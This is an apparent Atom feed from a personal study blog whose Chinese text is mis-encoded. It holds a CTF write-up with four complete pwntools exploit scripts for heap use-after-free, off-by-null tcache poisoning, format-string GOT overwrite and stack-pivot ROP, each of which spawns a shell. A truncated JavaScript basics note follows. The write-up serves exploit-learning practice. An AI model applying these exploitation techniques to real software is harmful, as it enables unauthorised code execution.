<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anza | å­¦ä¹ è®°å½•</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-07-26T04:22:07.686Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Anza</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DAS6</title>
    <link href="http://example.com/2023/06/05/DAS6/"/>
    <id>http://example.com/2023/06/05/DAS6/</id>
    <published>2023-06-05T07:17:27.000Z</published>
    <updated>2023-07-26T04:22:07.686Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ç›˜å¤ç›˜~</p><span id="more"></span><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="easynote"><a href="#easynote" class="headerlink" title="easynote"></a>easynote</h2><p>libc-2.23 çš„ uaf æ¼æ´ï¼Œç›´æ¥æ‰“æ¨¡æ¿ï¼Œå› ä¸ºç”¨ docker æ‰“çš„ï¼Œå¹²è„†ç›´æ¥ç”¨äº† glibc-all-in-one çš„ libc å’Œ ldã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;The length of your content ---&gt;\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content ---&gt;\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;The length of your content ---&gt;\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content ---&gt;\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;ddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;eee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">lb = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x45206</span>, <span class="number">0x4525a</span>, <span class="number">0xef9f4</span>, <span class="number">0xf0897</span>]</span><br><span class="line">malloc_hook = lb + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = lb + libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"><span class="comment">#free_hook = lb + libc.sym[&quot;__free_hook&quot;]</span></span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(lb))</span><br><span class="line">log.success(<span class="string">&quot;re ==&gt;&quot;</span> + <span class="built_in">hex</span>(realloc))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">8</span>, p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;s&#x27;</span>*<span class="number">0xb</span> + p64(lb + one_gadget[<span class="number">1</span>]) +p64(realloc))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="can-you-find-me"><a href="#can-you-find-me" class="headerlink" title="can_you_find_me"></a>can_you_find_me</h2><p>libc-2.27 ä¸‹åªæœ‰æ·»åŠ å’Œåˆ é™¤å †çš„æ“ä½œï¼Œå­˜åœ¨ off-by-nullï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071642328.png" alt="image-20230607164227278" style="zoom: 50%;" /><p>å¯ä»¥ä¿®æ”¹ prev-size ä½å’Œ  size ä½ä½¿ç”¨ unlink é€ æˆ tcache poisoningï¼Œç”±äºæ—  show åŠŸèƒ½ï¼Œéœ€è¦çˆ†ç ´ main_arena+96 ä¸º stdoutï¼Œæ‰“ stdout æ³„éœ² libcï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x60</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)     <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0x70</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x5f0</span>, <span class="string">&#x27;e&#x27;</span>*<span class="number">0x5f0</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;f&#x27;</span>*<span class="number">0x20</span>)     <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#-0</span></span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#-3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;\x20\x06&#x27;</span>)  <span class="comment">#0</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#-4</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#-1</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#-0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x500</span>-<span class="number">8</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;\x60\xe7&#x27;</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)          <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xc8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x78</span>, p64(system))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071708242.png" alt="image-20230607170831057" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071710504.png" alt="image-20230607171022315" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071724501.png" alt="image-20230607172442447" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071804704.png" alt="image-20230607180451501" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071812328.png" alt="image-20230607181237126" style="zoom:80%;" /><h2 id="candy-shop"><a href="#candy-shop" class="headerlink" title="candy_shop"></a>candy_shop</h2><p>æ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤ï¼Œå‘ç° got è¡¨å¯å†™ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306081609452.png" alt="image-20230608160942294" style="zoom: 67%;" /><p>ç¨‹åºä¸­å­˜åœ¨ä¸¤æ¬¡ printf æ ¼å¼åŒ–æ¼æ´å’Œ ä¸€æ¬¡ bss æ®µä¸Šçš„è¶Šç•Œå†™ï¼Œæ€è·¯å°±æ˜¯æ³„éœ²å‡º libcï¼Œç„¶åè¶Šç•Œå†™ printf çš„ got è¡¨ä¸º systemï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b *$rebase(0x1695)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me your name: \n&quot;</span>, <span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;you have received a gift:0x&quot;</span>)</span><br><span class="line">lb = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)-<span class="number">128</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">system = lb + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Which one you want to bye: &quot;</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b *$rebase(0x0156D)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;-10&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">6</span> + p64(system))</span><br><span class="line">io.sendline(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="A-dream"><a href="#A-dream" class="headerlink" title="A_dream"></a>A_dream</h2><p>å«æœ‰å­è¿›ç¨‹çš„æ ˆæº¢å‡ºï¼ˆè¿ç§»ï¼‰ã€‚å€¼å¾—æ³¨æ„çš„ç‚¹æœ‰ï¼š</p><ol><li>å­è¿›ç¨‹çš„æ ˆä½¿ç”¨çš„æ˜¯<code>mmap</code>å‡ºçš„ä¸€ç‰‡ç©ºé—´ï¼Œä¸ libc åŸºå€æœ‰ç€å›ºå®šçš„åç§»ã€‚</li><li>ä¸»è¿›ç¨‹å¼€å¯äº†æ²™ç›’ï¼ˆåªå…è®¸ <code>read</code>å’Œ<code>write</code>ï¼Œæ— æ³•åˆ©ç”¨ï¼‰ï¼Œä½†ä¸å½±å“å­è¿›ç¨‹ï¼Œå› æ­¤åœ¨å­è¿›ç¨‹è¿›è¡Œ system(â€˜/bin/shâ€™) å³å¯ã€‚</li><li>gdb è°ƒè¯•å­è¿›ç¨‹æ–¹æ³•ï¼Œä½¿ç”¨<code>thread x</code>åˆ‡æ¢è¿›ç¨‹ï¼Œ<code>info threads</code>æŸ¥çœ‹è¿›ç¨‹ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./A_dream&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;A_dream&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404080</span> + <span class="number">0x100</span></span><br><span class="line">magic_read = <span class="number">0x4013AE</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span> + p64(bss + <span class="number">0x40</span>) + p64(magic_read)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401483</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401481</span></span><br><span class="line">leave_ret = <span class="number">0x000000000040136c</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = p64(pop_rsi_r15_ret) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&quot;read&quot;</span>]) + p64(pop_rdi_ret) + p64(<span class="number">0x1000</span>) + p64(elf.plt[<span class="string">&quot;sleep&quot;</span>]) + p64(<span class="number">0</span>) + p64(bss-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(p64(magic_read))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(magic_read)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">lb = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">system = lb + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = lb + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">pop_rdi_rbp_ret = lb + <span class="number">0x00000000000248f2</span></span><br><span class="line">thread_stack_rop_addr = lb - <span class="number">0x4150</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(ret) + p64(pop_rdi_rbp_ret) + p64(binsh) + p64(<span class="number">0</span>) + p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(thread_stack_rop_addr-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¤ç›˜å¤ç›˜~&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>front-end</title>
    <link href="http://example.com/2023/05/21/front-end/"/>
    <id>http://example.com/2023/05/21/front-end/</id>
    <published>2023-05-21T02:42:39.000Z</published>
    <updated>2023-05-23T04:02:34.666Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-JS-åŸºç¡€"><a href="#1-JS-åŸºç¡€" class="headerlink" title="1. JS åŸºç¡€"></a>1. JS åŸºç¡€</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>â€‹    JS æ˜¯è¿è¡Œåœ¨å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰çš„ç¼–ç¨‹è¯­è¨€ï¼Œå®ç°äººæœºäº¤äº’æ•ˆæœï¼Œhtml å’Œ css æ˜¯æ ‡è®°è¯­è¨€ã€‚å¯ä»¥ç”¨äºåšç½‘é¡µç‰¹æ•ˆã€è¡¨å•éªŒè¯ã€æ•°æ®äº¤äº’ã€æœåŠ¡ç«¯ç¼–ç¨‹ï¼ˆnode.jsï¼‰ã€‚</p><p>â€‹    JS ç”± ECMAScript å’Œ Web APIs ç»„æˆï¼Œå…¶ä¸­ ECMAScript è§„å®šäº† js åŸºç¡€è¯­æ³•ï¼ŒWeb APIs ä¸­çš„ DOM  æ“ä½œæ–‡æ¡£ï¼ˆæ“ä½œé¡µé¢å…ƒç´ ï¼‰ã€BOM æ“ä½œæµè§ˆå™¨ï¼ˆæ“ä½œé¡µé¢å¼¹çª—ï¼‰ã€‚</p><h3 id="ä¹¦å†™ä½ç½®"><a href="#ä¹¦å†™ä½ç½®" class="headerlink" title="ä¹¦å†™ä½ç½®"></a>ä¹¦å†™ä½ç½®</h3><p>â€‹    åˆ†ä¸º å†…éƒ¨/å¤–éƒ¨/è¡Œå†… JSã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ³¨ï¼šHTMLä»ä¸Šå¾€ä¸‹åŠ è½½</span><br><span class="line">å†…éƒ¨ï¼šä½äº&lt;/body&gt;ä¸Šæ–¹ã€‚</span><br><span class="line">å¤–éƒ¨ï¼šé€šè¿‡srcå¼•å…¥ï¼Œ&lt;script src=&#x27;my.js&#x27;&gt;&lt;/script&gt;ã€‚</span><br><span class="line">å†…è”ï¼šä½äºæ ‡ç­¾ä¸­é—´ï¼Œ&lt;button onclick=&#x27;js&#x27;&gt;&lt;/button&gt;ã€‚</span><br><span class="line">â€»é€šå¸¸æŠŠJSæ”¾åœ¨é¡µé¢åº•éƒ¨ã€‚</span><br></pre></td></tr></table></figure><h3 id="æ³¨é‡Šå’Œç»“æŸç¬¦"><a href="#æ³¨é‡Šå’Œç»“æŸç¬¦" class="headerlink" title="æ³¨é‡Šå’Œç»“æŸç¬¦"></a>æ³¨é‡Šå’Œç»“æŸç¬¦</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å•è¡Œæ³¨é‡Šï¼š//</span><br><span class="line">å¿«æ·é”®ï¼šctrl+/</span><br><span class="line">å—æ³¨é‡Šï¼š/**/</span><br><span class="line">å¿«æ·é”®ï¼šshift+alt+a</span><br><span class="line"></span><br><span class="line">ç»“æŸç¬¦ï¼š; æˆ–è€…ä¸å†™</span><br></pre></td></tr></table></figure><h3 id="è¾“å…¥è¾“å‡ºè¯­æ³•"><a href="#è¾“å…¥è¾“å‡ºè¯­æ³•" class="headerlink" title="è¾“å…¥è¾“å‡ºè¯­æ³•"></a>è¾“å…¥è¾“å‡ºè¯­æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºï¼šdocument.write(&#x27;è¦å‡ºçš„å†…å®¹&#x27;)</span><br><span class="line">     document.write(&#x27;&lt;h1&gt;111&lt;/h1&gt;&#x27;)</span><br><span class="line">     alert(&#x27;å†…å®¹&#x27;)</span><br><span class="line">     console.log(&#x27;å†…å®¹&#x27;)</span><br><span class="line">è¾“å…¥ï¼šprompt(&#x27;è¯·è¾“å…¥å¹´é¾„ï¼š&#x27;)</span><br><span class="line">â€»æŸäº›è¾“å…¥è¾“å‡ºè¯­æ³•ä¼šè·³è¿‡é¡µé¢æ¸²æŸ“ä¼˜å…ˆè¢«æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h3 id="å­—é¢é‡"><a href="#å­—é¢é‡" class="headerlink" title="å­—é¢é‡"></a>å­—é¢é‡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1000 æ•°å­—å­—é¢é‡</span><br><span class="line">&#x27;Anzac&#x27; å­—ç¬¦ä¸²å­—é¢é‡</span><br><span class="line">[] æ•°ç»„å­—é¢é‡</span><br><span class="line">&#123;&#125; å¯¹è±¡å­—é¢é‡</span><br></pre></td></tr></table></figure><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å˜é‡å£°æ˜ï¼šlet å˜é‡å</span><br><span 